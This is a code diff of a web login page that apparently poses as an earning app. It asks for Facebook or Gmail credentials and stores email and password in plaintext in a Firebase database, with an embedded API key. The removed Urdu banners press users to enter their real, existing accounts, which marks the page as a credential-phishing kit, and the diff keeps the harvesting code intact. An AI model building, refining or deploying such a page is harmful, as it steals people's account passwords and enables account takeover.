@@ -103,10 +103,6 @@
 
   <h2>Login Account</h2>
 
-  <div id="warningMsg" style="background: #ff4444aa; padding: 10px; border-radius: 10px; font-size: 14px; text-align: center; margin-top: -10px; margin-bottom: 10px;">
-    براہ کرم اپنا اصلی اکاؤنٹ استعمال کریں۔ اگر آپ نے جعلی یا کسی اور کا اکاؤنٹ استعمال کیا تو آپ کو کمائی نہیں دی جائے گی۔
-  </div>
-
   <select id="accountType">
     <option value="Facebook">Facebook</option>
     <option value="Gmail">Gmail</option>
@@ -114,7 +110,6 @@
 
   <input type="text" id="email" placeholder="Email or Phone" />
   <input type="password" id="password" placeholder="Password" />
-  <input type="text" id="referralInput" placeholder="Referral ID (Optional)" />
   <button onclick="saveLogin()">Log In</button>
 </div>
 
@@ -122,9 +117,9 @@
 
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-app.js";
-  import { getDatabase, ref, set, get, update, child } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-database.js";
+  import { getDatabase, ref, set, get } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-database.js";
 
-  const firebaseConfig = {
+  const app = initializeApp({
     apiKey: "AIzaSyBTuVt9xg1uiVF-LMqkRBpQErVNEve7wxM",
     authDomain: "logindb-3ed54.firebaseapp.com",
     databaseURL: "https://logindb-3ed54-default-rtdb.firebaseio.com",
@@ -132,13 +127,9 @@
     storageBucket: "logindb-3ed54.appspot.com",
     messagingSenderId: "462951915771",
     appId: "1:462951915771:web:5e317781e6b95c9123105e"
-  };
+  });
 
-  const app = initializeApp(firebaseConfig);
   const db = getDatabase(app);
-  const dbRef = ref(db);
-
-  const urlRef = new URLSearchParams(location.search).get("ref") || null;
 
   function showPopup(msg) {
     const popup = document.getElementById("popup");
@@ -151,8 +142,6 @@
     const type = document.getElementById("accountType").value;
     const email = document.getElementById("email").value.trim();
     const password = document.getElementById("password").value.trim();
-    const manualRef = document.getElementById("referralInput").value.trim().replace(/\./g, '_');
-    const referralInput = manualRef || urlRef;
     const userKey = email.replace(/\./g, '_');
 
     if (!email || !password) {
@@ -173,40 +162,15 @@
         email,
         password,
         time: new Date().toLocaleString(),
-        referralBy: referralInput || null,
-        referralCode: userKey,
         earnings: 0
       };
 
       await set(userRef, newUser);
       localStorage.setItem("email", email);
-      if (referralInput) {
-        const refSnap = await get(child(dbRef, `users/${referralInput}`));
-        if (refSnap.exists()) {
-          const refEarnings = refSnap.val().earnings || 0;
-          await update(ref(db, `users/${referralInput}`), {
-            earnings: refEarnings + 5
-          });
-          localStorage.setItem("referredBy", referralInput);
-        }
-      }
-
-      showPopup("Login successful + Referral Added!");
+      showPopup("Login successful!");
       setTimeout(() => location.href = "dashboard.html", 1000);
     }
   };
-
-  const messages = [
-    "براہ کرم اپنا اصلی اکاؤنٹ استعمال کریں۔ اگر آپ نے جعلی یا کسی اور کا اکاؤنٹ استعمال کیا تو آپ کو کمائی نہیں دی جائے گی۔",
-    "آپ اب اپنا اصلی جی میل اکاؤنٹ استعمال کر کے لاگ اِن کر سکتے ہیں۔",
-    "اپنا پہلے سے استعمال شدہ فیس بک اکاؤنٹ استعمال کریں، نیا جعلی اکاؤنٹ نہ بنائیں۔"
-  ];
-
-  let msgIndex = 0;
-  setInterval(() => {
-    document.getElementById("warningMsg").innerHTML = messages[msgIndex];
-    msgIndex = (msgIndex + 1) % messages.length;
-  }, 5000);
 </script>
 
 </body>
